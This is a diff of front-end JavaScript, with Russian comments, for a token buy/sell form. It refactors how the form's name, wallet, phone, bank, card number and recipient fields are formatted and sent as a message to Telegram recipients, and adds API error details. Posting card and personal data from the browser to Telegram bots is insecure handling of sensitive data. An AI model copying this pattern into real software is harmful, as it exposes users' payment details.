@@ -253,34 +253,37 @@
                     try {
                         // Собираем данные из формы
                         const dataToSend = {
-                            name: formData.name,
-                            walletAddress: formData.walletAddress,
-                            phoneNumber: formData.phoneNumber,
-                            bankName: formData.bankName,
-                            cardNumber: formData.cardNumber,
-                            recipientName: formData.recipientName,
-                            tokenAmount: formData.cayrosAmount || formData.solanaAmount,
-                            totalCost: formData.totalCost,
+                            name: formData.name || 'Не указано',
+                            walletAddress: formData.walletAddress || 'Не указано',
+                            phoneNumber: formData.phoneNumber || 'Не указано',
+                            bankName: formData.bankName || 'Не указано',
+                            cardNumber: formData.cardNumber || 'Не указано',
+                            recipientName: formData.recipientName || 'Не указано',
+                            tokenAmount: formData.cayrosAmount || formData.solanaAmount || 'Не указано',
+                            totalCost: formData.totalCost || 'Не рассчитана',
                             operationType: isBuyOperation ? 'Подтверждение покупки' : 'Подтверждение продажи',
                             tokenName: tokenName // Добавляем название токена
                         };
 
                         // Формируем текст сообщения
-                        const message = [
-                            dataToSend.operationType, // Тип операции (покупка/продажа)
-                            `Имя: ${dataToSend.name || 'Не указано'}`,
-                            `Адрес кошелька: ${dataToSend.walletAddress || 'Не указано'}`,
-                            `Номер телефона: ${dataToSend.phoneNumber || 'Не указано'}`,
-                            `Количество ${dataToSend.tokenName}: ${dataToSend.tokenAmount || 'Не указано'}`,
-                            `Общая стоимость: ${dataToSend.totalCost || 'Не рассчитана'}`,
+                        const messageParts = [
+                            dataToSend.operationType, // Тип операции
+                            `Имя: ${dataToSend.name}`,
+                            `Адрес кошелька: ${dataToSend.walletAddress}`,
+                            `Номер телефона: ${dataToSend.phoneNumber}`,
+                            `Количество ${dataToSend.tokenName}: ${dataToSend.tokenAmount}`,
+                            `Общая стоимость: ${dataToSend.totalCost}`
+                        ];
 
-                            // Дополнительные поля для продажи
-                            !isBuyOperation && `Банк получателя: ${dataToSend.bankName || 'Не указано'}`,
-                            !isBuyOperation && `Номер карты: ${dataToSend.cardNumber || 'Не указано'}`,
-                            !isBuyOperation && `Получатель: ${dataToSend.recipientName || 'Не указано'}`
-                        ]
-                        .filter(Boolean) // Убираем пустые строки
-                        .join('\n'); // Соединяем строки через перенос
+                        // Добавляем дополнительные поля для продажи
+                        if (!isBuyOperation) {
+                            messageParts.push(`Банк получателя: ${dataToSend.bankName}`);
+                            messageParts.push(`Номер карты: ${dataToSend.cardNumber}`);
+                            messageParts.push(`Получатель: ${dataToSend.recipientName}`);
+                        }
+
+                        // Объединяем части сообщения в единый текст
+                        const message = messageParts.join('\n');
 
                         // Отправляем сообщение каждому получателю
                         let allMessagesSent = true;
@@ -330,7 +333,8 @@
                     });
 
                     if (!response.ok) {
-                        throw new Error(`Telegram API error: ${response.status} ${response.statusText}`);
+                        const errorData = await response.json(); // Получаем детали ошибки
+                        throw new Error(`Telegram API error (${response.status}): ${errorData.description}`);
                     }
 
                     const data = await response.json();
